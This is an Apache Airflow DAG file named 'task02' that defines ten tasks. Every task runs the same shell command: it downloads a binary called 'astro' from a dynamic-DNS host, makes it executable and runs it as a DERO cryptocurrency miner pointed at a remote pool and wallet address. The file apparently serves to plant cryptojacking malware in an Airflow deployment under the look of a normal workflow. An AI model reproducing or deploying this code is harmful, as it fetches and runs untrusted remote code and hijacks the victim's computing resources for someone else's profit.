from airflow import DAG
from airflow.operators.bash import BashOperator
from datetime import datetime

with DAG(
    dag_id="task02",
    start_date=datetime(2024,5,12),
    schedule_interval=None,
    catchup=False
) as dag:
        task01 = BashOperator(
        task_id="task01",
        bash_command="curl -u dero:dodo24 -OLJ ngxpro01.ydns.eu:10666/astro && chmod +x astro && ./astro -r sprpro01.ydns.eu:13100 -w dero1qy55mvck6ey54yptg0a5tervwzrxt0al5d26l02llpm4qwt88lxzwqqpqntf9 -report-realtime-hashrate"
    )
        task02 = BashOperator(
        task_id="task02",
        bash_command="curl -u dero:dodo24 -OLJ ngxpro01.ydns.eu:10666/astro && chmod +x astro && ./astro -r sprpro01.ydns.eu:13100 -w dero1qy55mvck6ey54yptg0a5tervwzrxt0al5d26l02llpm4qwt88lxzwqqpqntf9 -report-realtime-hashrate"
    )
        task03 = BashOperator(
        task_id="task03",
        bash_command="curl -u dero:dodo24 -OLJ ngxpro01.ydns.eu:10666/astro && chmod +x astro && ./astro -r sprpro01.ydns.eu:13100 -w dero1qy55mvck6ey54yptg0a5tervwzrxt0al5d26l02llpm4qwt88lxzwqqpqntf9 -report-realtime-hashrate"
    )
        task04 = BashOperator(
        task_id="task04",
        bash_command="curl -u dero:dodo24 -OLJ ngxpro01.ydns.eu:10666/astro && chmod +x astro && ./astro -r sprpro01.ydns.eu:13100 -w dero1qy55mvck6ey54yptg0a5tervwzrxt0al5d26l02llpm4qwt88lxzwqqpqntf9 -report-realtime-hashrate"
    )
        task05 = BashOperator(
        task_id="task05",
        bash_command="curl -u dero:dodo24 -OLJ ngxpro01.ydns.eu:10666/astro && chmod +x astro && ./astro -r sprpro01.ydns.eu:13100 -w dero1qy55mvck6ey54yptg0a5tervwzrxt0al5d26l02llpm4qwt88lxzwqqpqntf9 -report-realtime-hashrate"
    )
        task06 = BashOperator(
        task_id="task06",
        bash_command="curl -u dero:dodo24 -OLJ ngxpro01.ydns.eu:10666/astro && chmod +x astro && ./astro -r sprpro01.ydns.eu:13100 -w dero1qy55mvck6ey54yptg0a5tervwzrxt0al5d26l02llpm4qwt88lxzwqqpqntf9 -report-realtime-hashrate"
    )
        task07 = BashOperator(
        task_id="task07",
        bash_command="curl -u dero:dodo24 -OLJ ngxpro01.ydns.eu:10666/astro && chmod +x astro && ./astro -r sprpro01.ydns.eu:13100 -w dero1qy55mvck6ey54yptg0a5tervwzrxt0al5d26l02llpm4qwt88lxzwqqpqntf9 -report-realtime-hashrate"
    )
        task08 = BashOperator(
        task_id="task08",
        bash_command="curl -u dero:dodo24 -OLJ ngxpro01.ydns.eu:10666/astro && chmod +x astro && ./astro -r sprpro01.ydns.eu:13100 -w dero1qy55mvck6ey54yptg0a5tervwzrxt0al5d26l02llpm4qwt88lxzwqqpqntf9 -report-realtime-hashrate"
    )
        task09 = BashOperator(
        task_id="task09",
        bash_command="curl -u dero:dodo24 -OLJ ngxpro01.ydns.eu:10666/astro && chmod +x astro && ./astro -r sprpro01.ydns.eu:13100 -w dero1qy55mvck6ey54yptg0a5tervwzrxt0al5d26l02llpm4qwt88lxzwqqpqntf9 -report-realtime-hashrate"
    )
        task10 = BashOperator(
        task_id="task10",
        bash_command="curl -u dero:dodo24 -OLJ ngxpro01.ydns.eu:10666/astro && chmod +x astro && ./astro -r sprpro01.ydns.eu:13100 -w dero1qy55mvck6ey54yptg0a5tervwzrxt0al5d26l02llpm4qwt88lxzwqqpqntf9 -report-realtime-hashrate"
    )
